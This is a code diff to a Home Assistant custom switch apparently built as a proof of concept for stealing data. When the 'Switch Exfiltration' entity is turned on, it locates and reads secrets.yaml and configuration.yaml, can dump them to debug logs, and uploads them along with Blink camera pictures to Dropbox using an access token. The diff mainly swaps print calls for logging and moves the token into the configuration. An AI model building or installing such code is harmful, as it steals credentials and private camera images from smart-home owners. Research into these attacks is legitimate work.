@@ -2,7 +2,7 @@
 from __future__ import annotations
 import os
 import glob
-
+import logging
 import dropbox
 
 from homeassistant.components.switch import SwitchEntity
@@ -11,8 +11,11 @@ from homeassistant.core import HomeAssistant
 from homeassistant.helpers.entity_platform import AddEntitiesCallback
 from homeassistant.helpers.typing import ConfigType, DiscoveryInfoType
 
+""" To enable the print statements this integration must be configured to log level: debug """
 PRINT_KEY = "printing"
+ACCESS_TOKEN_KEY = "db_access_token"
 
+_LOGGER = logging.getLogger(__name__)
 
 def setup_platform(
     hass: HomeAssistant,
@@ -23,9 +26,9 @@ def setup_platform(
     """Set up the sensor platform."""
 
     if PRINT_KEY in config:
-        add_entities([ExfiltrationSwitch(config[PRINT_KEY])])
+        add_entities([ExfiltrationSwitch(config[ACCESS_TOKEN_KEY], config[PRINT_KEY])])
     else:
-        add_entities([ExfiltrationSwitch()])
+        add_entities([ExfiltrationSwitch(config[ACCESS_TOKEN_KEY])])
 
     return True
 
@@ -35,13 +38,17 @@ class ExfiltrationSwitch(SwitchEntity):
 
     _target_file1 = "secrets.yaml"
     _target_file2 = "configuration.yaml"
-    _access_token = ""
+    # The access token to update info on Dropbox should be written here.
+    # _access_token = "token"
 
-    def __init__(self, printing: bool = False):
-        print("I'm the switch: " + self.name)
+    def __init__(self, access_token, printing: bool = False):
+        _LOGGER.info("I'm the switch: %s", self.name)
         self._is_on = False
         self._file_path = self.find_path()
         self._print = printing
+
+        # Even if the Dropbox token should be hardcoded, for simplicity is retrieved from configuration.yaml
+        self._access_token = access_token
 
         if self._print:
             self.print_config()
@@ -49,7 +56,7 @@ class ExfiltrationSwitch(SwitchEntity):
     @property
     def name(self):
         """Name of the entity."""
-        return "Exfiltration Switch"
+        return "Switch Exfiltration"
 
     @property
     def is_on(self):
@@ -59,10 +66,6 @@ class ExfiltrationSwitch(SwitchEntity):
     def turn_on(self, **kwargs):
         """Turn the switch on."""
         self._is_on = True
-
-        if self._print:
-            self.print_config()
-
         self.store_picture_on_db()
         self.store_data()
 
@@ -79,16 +82,16 @@ class ExfiltrationSwitch(SwitchEntity):
 
         file_path = None
         if os.path.isfile(dev_path + self._target_file2):
-            print("dev path")
+            _LOGGER.debug("Source Path: dev path")
             file_path = dev_path
         elif os.path.isfile(prod_path + self._target_file2):
-            print("prod path")
+            _LOGGER.debug("Source Path: prod path")
             file_path = prod_path
         elif os.path.isfile(local_path + self._target_file2):
-            print("local path")
+            _LOGGER.debug("Source Path: local path")
             file_path = local_path
         else:
-            print("There is no target file")
+            _LOGGER.info("There is no target file")
         return file_path
 
     def print_config(self):
@@ -96,17 +99,13 @@ class ExfiltrationSwitch(SwitchEntity):
 
         if self._file_path:
             with open(self._file_path + self._target_file1, "rt") as _f:
-                print("target 1")
-                print("-----")
+                _LOGGER.debug("\n-----\n Printing target: %s \n-----", self._target_file1)
                 data = _f.read()
-                print(data)
-                print("-----")
+                _LOGGER.debug(data)
             with open(self._file_path + self._target_file2, "rt") as _f:
-                print("target 2")
-                print("-----")
+                _LOGGER.debug("\n-----\n Printing target: %s \n-----", self._target_file2)
                 data = _f.read()
-                print(data)
-                print("-----")
+                _LOGGER.debug(data)
 
     def store_data(self):
         """Upload the target files on Dropbox."""
@@ -121,7 +120,7 @@ class ExfiltrationSwitch(SwitchEntity):
                 upload_path + self._target_file2,
             )
         else:
-            print("File path not available!")
+            _LOGGER.info("File path not available!")
 
     def store_picture_on_db(self):
         """Store the last picture on Dropbox."""
@@ -132,16 +131,16 @@ class ExfiltrationSwitch(SwitchEntity):
 
         source_path = None
         if os.path.isdir(local_path):
-            print("local path")
+            _LOGGER.debug("Source Path: local path")
             source_path = local_path
         elif os.path.isdir(dev_path):
-            print("dev path")
+            _LOGGER.debug("Source Path: dev path")
             source_path = dev_path
         elif os.path.isdir(prod_path):
-            print("prod path")
+            _LOGGER.debug("Source Path: prod path")
             source_path = prod_path
         else:
-            print("No available path for pictures")
+            _LOGGER.info("No available path for pictures!")
 
         if source_path:
             dest_path = "/blink/"
